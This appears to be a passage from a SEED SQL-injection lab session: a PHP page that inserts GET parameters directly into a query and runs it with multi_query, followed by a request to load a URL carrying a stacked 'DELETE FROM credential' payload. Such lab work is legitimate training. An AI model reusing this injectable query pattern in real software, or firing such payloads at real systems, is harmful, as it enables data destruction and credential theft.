<?php
$input_uname = $_GET['username'];
$input_pwd = $_GET['Password'];
$hashed_pwd = sha1($input_pwd);

$sql = "SELECT id, name, eid, salary, birth, ssn, phoneNumber, address, email,nickname,Password
FROM credential
WHERE name= '$input_uname' and Password='$hashed_pwd'";

echo "<h2>FULL SQL QUERY:</h2>";
echo "<pre>" . htmlspecialchars($sql) . "</pre>";
echo "<hr>";

// Now try to execute it
$dbhost="10.9.0.6";
$dbuser="seed";
$dbpass="dees";
$dbname="sqllab_users";
$conn = new mysqli($dbhost, $dbuser, $dbpass, $dbname);

if ($conn->multi_query($sql)) {
    echo "<h3>✓ multi_query executed successfully!</h3>";
    
    do {
        if ($result = $conn->store_result()) {
            echo "Result set: " . $result->num_rows . " rows<br>";
            $result->free();
        } else {
            if ($conn->errno) {
                echo "<b>ERROR:</b> " . $conn->error . "<br>";
            } else {
                echo "No result set. Affected rows: " . $conn->affected_rows . "<br>";
            }
        }
    } while ($conn->more_results() && $conn->next_result());
    
    echo "<br><b>All queries processed.</b><br>";
} else {
    echo "<h3>✗ multi_query FAILED</h3>";
    echo "<b>ERROR:</b> " . $conn->error . "<br>";
}

// Check if Alice exists
echo "<hr><h3>Checking if Alice exists:</h3>";
$check = $conn->query("SELECT name FROM credential WHERE name='Alice'");
if ($check && $check->num_rows > 0) {
    echo "❌ Alice STILL EXISTS";
} else {
    echo "✅ Alice DELETED!";
}
?>
```

Now visit with this URL and **show me the complete output**:
```
http://www.seed-server.com/unsafe_home.php?username=admin';%20DELETE%20FROM%20credential%20WHERE%20name='Alice';%20--%20&Password=test
